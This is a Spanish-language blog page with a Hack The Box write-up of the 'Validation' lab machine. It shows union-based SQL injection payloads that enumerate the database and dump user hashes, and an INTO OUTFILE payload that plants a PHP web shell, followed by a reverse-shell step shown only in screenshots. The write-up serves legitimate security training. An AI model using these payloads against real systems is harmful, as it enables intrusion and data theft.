<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>            WriteUp HTB - Máquina validation - RuyzTzt7      Ciberseguridad y Hacking Ético      </title>
<meta name="description" content="En este artículo, resolveremos la máquina Validation de la plataforma HTB.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="RuyzTzt7 | Ciberseguridad y Hacking Ético">
<meta property="og:title" content="WriteUp HTB - Máquina validation">
<meta property="og:url" content="http://localhost:4000/writeup-validation/">


  <meta property="og:description" content="En este artículo, resolveremos la máquina Validation de la plataforma HTB.">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb/validation/logo.png">





  <meta property="article:published_time" content="2025-04-12T00:00:00+02:00">





  

  


<link rel="canonical" href="http://localhost:4000/writeup-validation/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "Álvaro",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="RuyzTzt7 | Ciberseguridad y Hacking Ético Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Artículos</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categorías</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Etiquetas</a>
            </li><li class="masthead__menu-item">
              <a href="/buscador/" >Buscador</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >Contacto</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">WriteUp HTB - Máquina validation</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="Álvaro Ruiz Gutiérrez" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Álvaro Ruiz Gutiérrez</h3>
    
    
      <p class="author__bio" itemprop="description">
        Estudiante de Ingeniería Informática del Software de la Universidad de Sevilla y Futuro Analista de CiberSeguridad
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/alvaro-ruiz-guti%C3%A9rrez-515684314/" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      
        <li>
          <a href="https://instagram.com/alvarorugu7" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-instagram" aria-hidden="true"></i> Instagram
          </a>
        </li>
      

      

      

      
        <li>
          <a href="https://github.com/alvruigut" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="WriteUp HTB - Máquina validation">
    <meta itemprop="description" content="En este artículo, resolveremos la máquina Validation de la plataforma HTB.">
    <meta itemprop="datePublished" content="April 12, 2025">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">WriteUp HTB - Máquina validation
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2025-04-12T00:00:00+02:00">April 12, 2025 </time>&emsp;
          
          
        </p>
        <p align="center">
  <img src="/assets/images/htb/validation/burp.png" alt="Validation" width="2200" />
</p>

<hr />

<h2 id="explotación-sqli">Explotación SQLI.</h2>

<p>Vemos en primer lugar que nos enfrentamos ante un panel donde no se acontece ningun login. Solo un post donde te creas un usuario al acceder.</p>

<p align="center">
  <img src="/assets/images/htb/validation/web.png" alt="1" width="2200" />
</p>

<p>Probamos a alterar el campo de país con Burpsuite para ver si se acontece algún fallo en la web.</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp1.png" alt="2" width="2200" />
</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp2.png" alt="3" width="2200" />
</p>

<p>Como falla, podemos intuir que es vulnerable a SQLI, además vemos que se interpreta código php y que es un servidor apache alojado en la ruta del sistema /var/www/html.</p>

<p>Ahora probaremos a lanzar un:</p>

<ul>
  <li><strong>Comando:</strong>
    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">order</span> <span class="n">by</span> <span class="mi">100</span><span class="o">--</span> <span class="o">-</span>
</code></pre></div>    </div>
  </li>
</ul>

<p>para probar listar un ordenamiento de los datos basados en la columna número 100. En caso de responderte el mismo error en vez de alguno que te indique que se desconoce los datos de esa columna, podremos ir inyectando código con un</p>

<ul>
  <li><strong>Comando:</strong></li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="mf">....</span> <span class="o">--</span> <span class="o">-</span>

</code></pre></div></div>

<p align="center">
  <img src="/assets/images/htb/validation/burp3.png" alt="4" width="2200" />
</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp4.png" alt="5" width="2200" />
</p>

<p>Probaremos a listar las base de datos existentes:</p>

<ul>
  <li><strong>Comando:</strong>
    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="no">SELECT</span> <span class="nf">database</span><span class="p">()</span><span class="o">--</span> <span class="o">-</span>
</code></pre></div>    </div>
  </li>
</ul>

<p align="center">
  <img src="/assets/images/htb/validation/burp5.png" alt="6" width="2200" />
</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp6.png" alt="7" width="2200" />
</p>

<p>Vemos que la bd se llama registration.</p>

<p>Para listar el nombre de todas las base de datos:</p>

<ul>
  <li><strong>Comando:</strong>
    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="no">SELECT</span> <span class="n">schema_name</span> <span class="n">from</span> <span class="n">information_schema</span><span class="mf">.</span><span class="n">schemata</span><span class="o">--</span> <span class="o">-</span>
</code></pre></div>    </div>
  </li>
</ul>

<p align="center">
  <img src="/assets/images/htb/validation/burp7.png" alt="8" width="2200" />
</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp8.png" alt="9" width="2200" />
</p>

<p>Para listar las tablas que contiene la base de datos registration probamos con:</p>

<ul>
  <li>
    <p><strong>Comando:</strong></p>

    <p>’ union SELECT table_name from information_schema.tables where table_schema=”registration”– -
```</p>
  </li>
</ul>

<p align="center">
  <img src="/assets/images/htb/validation/burp9.png" alt="10" width="2200" />
</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp10.png" alt="11" width="2200" />
</p>

<p>Para listar las columnas de la tabla que queramos probamos con:</p>

<ul>
  <li><strong>Comando:</strong>
    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="no">SELECT</span> <span class="n">column_name</span> <span class="n">from</span> <span class="n">information_schema</span><span class="mf">.</span><span class="n">columns</span> <span class="n">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s2">"registration"</span> <span class="k">and</span> <span class="n">table_name</span><span class="o">=</span><span class="s2">"registration"</span><span class="o">--</span> <span class="o">-</span>
</code></pre></div>    </div>
  </li>
</ul>

<p align="center">
  <img src="/assets/images/htb/validation/burp11.png" alt="12" width="2200" />
</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp12.png" alt="13" width="2200" />
</p>

<p>Para listar el contenido de las dos entidades username y userhash, jugamos con group_concat para listar la info correspondiente de la tabla registration</p>

<ul>
  <li><strong>Comando:</strong>
    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="no">SELECT</span> <span class="nf">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="mh">0x3a</span><span class="p">,</span><span class="n">userhash</span><span class="p">)</span> <span class="n">from</span> <span class="n">registration</span><span class="o">--</span> <span class="o">-</span>
</code></pre></div>    </div>
  </li>
</ul>

<p>0x3a = ;</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp13.png" alt="14" width="2200" />
</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp14.png" alt="16" width="2200" />
</p>

<p>No vemos información relevante ya que en los hashes no hay ninguna password por la naturaleza de la web, por lo que intentaremos interpretar código php interpretando el fichero en la ruta del sistema que la que suponemos que se almacena.</p>

<ul>
  <li><strong>Comando:</strong>
    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="no">SELECT</span> <span class="s2">"Esto es una prueba"</span> <span class="n">into</span> <span class="n">outfile</span> <span class="s2">"/var/www/html/prueba.txt"</span><span class="o">--</span> <span class="o">-</span>
</code></pre></div>    </div>
  </li>
</ul>

<p align="center">
  <img src="/assets/images/htb/validation/burp15.png" alt="17" width="2200" />
</p>
<p>Vemos como nos lo interpreta y se almacena el el sistema, por lo que intentaremos de mandar código php para poder ejecturar comandos</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp16.png" alt="18" width="2200" />
</p>

<ul>
  <li><strong>Comando:</strong></li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' union SELECT "<span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span>" into outfile "/var/www/html/prueba.php"-- -
</code></pre></div></div>

<p align="center">
  <img src="/assets/images/htb/validation/burp17.png" alt="19" width="2200" />
</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp18.png" alt="20" width="2200" />
</p>

<p>Vemos que funciona desde la web, por lo que le pasaremos en oneliner para entablar una reverse shell a nuestro equipo encodeando a url la petición para que se interprete.</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp19.png" alt="21" width="2200" />
</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp20.png" alt="22" width="2200" />
</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp21.png" alt="23" width="2200" />
</p>

<hr />


        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#ejpt" class="page__taxonomy-item" rel="tag">eJPT</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#f%C3%A1cil" class="page__taxonomy-item" rel="tag">Fácil</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#mysql" class="page__taxonomy-item" rel="tag">MySQL</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#sqli" class="page__taxonomy-item" rel="tag">SQLI</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#ejpt" class="page__taxonomy-item" rel="tag">eJPT</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#htb" class="page__taxonomy-item" rel="tag">HTB</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#writeup" class="page__taxonomy-item" rel="tag">WriteUp</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2025-04-12T00:00:00+02:00">April 12, 2025</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/writeup-keeper/" class="pagination--pager" title="WriteUp HTB - Máquina Keeper
">Previous</a>
    
    
      <a href="#" class="pagination--pager disabled">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2025 Álvaro</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
